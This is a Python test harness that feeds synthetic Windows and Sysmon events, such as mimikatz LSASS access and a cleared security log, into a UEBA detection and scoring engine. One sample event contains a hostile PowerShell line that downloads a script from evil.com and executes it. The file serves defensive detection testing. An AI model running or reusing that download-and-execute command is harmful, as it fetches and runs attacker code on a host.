#!/usr/bin/env python3
"""
UEBA Risk Scoring Engine Test Harness.

Replays sample normalized events and prints:
- Matched rules
- Event scores
- Entity scores
- Alert decisions
"""

import sys
import json
from pathlib import Path
from datetime import datetime

# Add server src to path
server_src = Path(__file__).parent.parent / "src"
sys.path.insert(0, str(server_src))

from server.models import NormalizedEvent, EventCategory, EventSource
from server.ueba.rule_loader import RuleLoader, get_rule_loader
from server.ueba.scoring_engine import UEBAScorer, get_ueba_scorer
from server.ueba.alert_manager import AlertManager, AlertThresholds


def create_sample_events():
    """Create sample normalized events for testing."""
    events = []
    
    # Event 1: Suspicious LSASS access (should trigger R001)
    events.append(NormalizedEvent(
        timestamp=datetime.utcnow(),
        source=EventSource.SYSMON,
        host="WORKSTATION01",
        user="DOMAIN\\john.doe",
        event_id=10,
        provider="Microsoft-Windows-Sysmon",
        category=EventCategory.PROCESS,
        subcategory="process_access",
        process_name="mimikatz.exe",
        target_image="C:\\Windows\\System32\\lsass.exe",
        source_image="C:\\Users\\john.doe\\Downloads\\mimikatz.exe",
        granted_access="0x1410",
        message="ProcessAccess - mimikatz.exe accessing lsass.exe"
    ))
    
    # Event 2: PowerShell with encoded command (should trigger R018)
    events.append(NormalizedEvent(
        timestamp=datetime.utcnow(),
        source=EventSource.SYSMON,
        host="WORKSTATION01",
        user="DOMAIN\\john.doe",
        event_id=1,
        provider="Microsoft-Windows-Sysmon",
        category=EventCategory.PROCESS,
        subcategory="process_create",
        process_name="powershell.exe",
        parent_process_name="cmd.exe",
        command_line="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        image_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        message="Process Creation - powershell.exe with encoded command"
    ))
    
    # Event 3: Registry Run key modification (should trigger R012)
    events.append(NormalizedEvent(
        timestamp=datetime.utcnow(),
        source=EventSource.SYSMON,
        host="WORKSTATION02",
        user="DOMAIN\\jane.smith",
        event_id=13,
        provider="Microsoft-Windows-Sysmon",
        category=EventCategory.REGISTRY,
        subcategory="registry_value_set",
        process_name="malware.exe",
        target_object="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
        registry_details="C:\\Users\\jane.smith\\AppData\\Local\\Temp\\backdoor.exe",
        message="Registry Value Set - Run key modification"
    ))
    
    # Event 4: CreateRemoteThread into lsass (should trigger R020)
    events.append(NormalizedEvent(
        timestamp=datetime.utcnow(),
        source=EventSource.SYSMON,
        host="WORKSTATION01",
        user="DOMAIN\\john.doe",
        event_id=8,
        provider="Microsoft-Windows-Sysmon",
        category=EventCategory.PROCESS,
        subcategory="create_remote_thread",
        process_name="injector.exe",
        source_image="C:\\Temp\\injector.exe",
        target_image="C:\\Windows\\System32\\lsass.exe",
        start_address="0x7FFE0000",
        message="CreateRemoteThread - injector.exe into lsass.exe"
    ))
    
    # Event 5: Security log cleared (should trigger R015)
    events.append(NormalizedEvent(
        timestamp=datetime.utcnow(),
        source=EventSource.WINDOWS_EVENT,
        host="DC01",
        user="DOMAIN\\admin",
        event_id=1102,
        provider="Microsoft-Windows-Security-Auditing",
        channel="Security",
        category=EventCategory.OTHER,
        subcategory="audit_log_cleared",
        message="Security log was cleared"
    ))
    
    # Event 6: Normal process (should NOT trigger any rules)
    events.append(NormalizedEvent(
        timestamp=datetime.utcnow(),
        source=EventSource.SYSMON,
        host="WORKSTATION03",
        user="DOMAIN\\normal.user",
        event_id=1,
        provider="Microsoft-Windows-Sysmon",
        category=EventCategory.PROCESS,
        subcategory="process_create",
        process_name="notepad.exe",
        parent_process_name="explorer.exe",
        command_line="notepad.exe C:\\Users\\normal.user\\Documents\\notes.txt",
        image_path="C:\\Windows\\System32\\notepad.exe",
        message="Process Creation - notepad.exe"
    ))
    
    # Event 7: Office spawning PowerShell (should trigger R023)
    events.append(NormalizedEvent(
        timestamp=datetime.utcnow(),
        source=EventSource.SYSMON,
        host="WORKSTATION04",
        user="DOMAIN\\victim.user",
        event_id=1,
        provider="Microsoft-Windows-Sysmon",
        category=EventCategory.PROCESS,
        subcategory="process_create",
        process_name="powershell.exe",
        parent_process_name="WINWORD.EXE",
        command_line="powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        image_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        message="Process Creation - Word spawning PowerShell"
    ))
    
    return events


def print_separator(char="=", length=80):
    print(char * length)


def print_event_result(event: NormalizedEvent, event_score, user_score, host_score, alerts):
    """Print detailed results for an event."""
    print_separator()
    print(f"EVENT: {event.message}")
    print(f"  Host: {event.host} | User: {event.user} | EventID: {event.event_id}")
    print_separator("-", 80)
    
    if event_score.matched_rules:
        print(f"  MATCHED RULES ({len(event_score.matched_rules)}):")
        for match in event_score.matched_rules:
            rule = match.rule
            print(f"    - [{rule.id}] {rule.name}")
            print(f"      Base Score: {rule.base_score} | Confidence: {rule.confidence}")
            if rule.mitre:
                mitre_str = ", ".join(f"{m.technique_id}" for m in rule.mitre)
                print(f"      MITRE: {mitre_str}")
            if match.evidence:
                print(f"      Evidence: {json.dumps(match.evidence, default=str)[:100]}")
    else:
        print("  NO RULES MATCHED")
    
    print_separator("-", 80)
    print(f"  EVENT SCORE:")
    print(f"    Base Score: {event_score.base_score}")
    print(f"    Bonus Score: {event_score.bonus_score}")
    print(f"    Event Score (before modifiers): {event_score.event_score}")
    if event_score.modifiers_applied:
        print(f"    Modifiers Applied: {event_score.modifiers_applied}")
    print(f"    FINAL EVENT SCORE: {event_score.final_score}")
    
    print_separator("-", 80)
    print(f"  ENTITY SCORES:")
    if user_score:
        print(f"    User '{user_score.entity_id}':")
        print(f"      1h Score: {user_score.score_1h:.2f} | 24h Score: {user_score.score_24h:.2f}")
    if host_score:
        print(f"    Host '{host_score.entity_id}':")
        print(f"      1h Score: {host_score.score_1h:.2f} | 24h Score: {host_score.score_24h:.2f}")
    
    if alerts:
        print_separator("-", 80)
        print(f"  ALERTS GENERATED ({len(alerts)}):")
        for alert in alerts:
            print(f"    - [{alert.severity.upper()}] {alert.title}")
            print(f"      Entity: {alert.entity_type}:{alert.entity_id} | Score: {alert.score:.2f}")
    
    print()


def main():
    print_separator("=", 80)
    print("UEBA RISK SCORING ENGINE - TEST HARNESS")
    print_separator("=", 80)
    print()
    
    # Initialize components
    rules_path = Path(__file__).parent.parent / "config" / "rules"
    print(f"Loading rules from: {rules_path}")
    
    # Initialize scorer
    scorer = UEBAScorer(str(rules_path))
    rule_count = scorer.reload_rules()
    print(f"Loaded {rule_count} detection rules")
    
    # Initialize alert manager
    alert_manager = AlertManager()
    
    # Set up privileged users and high-value assets for testing
    scorer.modifiers.set_privileged_users(["admin", "administrator"])
    scorer.modifiers.set_high_value_hosts(["dc01", "dc02"])
    
    print()
    print_separator("=", 80)
    print("PROCESSING SAMPLE EVENTS")
    print_separator("=", 80)
    
    # Create and process sample events
    events = create_sample_events()
    
    total_matches = 0
    total_alerts = 0
    
    for event in events:
        # Score the event
        event_score, user_score, host_score = scorer.process_event(event)
        
        # Check for alerts
        alerts = alert_manager.evaluate_for_alert(event_score, user_score, host_score)
        
        # Print results
        print_event_result(event, event_score, user_score, host_score, alerts)
        
        total_matches += len(event_score.matched_rules)
        total_alerts += len(alerts)
    
    # Summary
    print_separator("=", 80)
    print("SUMMARY")
    print_separator("=", 80)
    print(f"  Events Processed: {len(events)}")
    print(f"  Total Rule Matches: {total_matches}")
    print(f"  Total Alerts Generated: {total_alerts}")
    print()
    
    # Show top risky entities
    print("TOP RISKY USERS (1h window):")
    for entity_type in ['user', 'host']:
        print(f"\n  {entity_type.upper()}S:")
        # Get from aggregator
        for key, events_list in scorer.aggregator._entity_events.items():
            if key[0] == entity_type:
                entity_score = scorer.aggregator.get_entity_score(key[0], key[1])
                if entity_score.score_1h > 0:
                    print(f"    - {key[1]}: {entity_score.score_1h:.2f} (1h) / {entity_score.score_24h:.2f} (24h)")
    
    print()
    print_separator("=", 80)
    print("TEST COMPLETE")
    print_separator("=", 80)


if __name__ == "__main__":
    main()
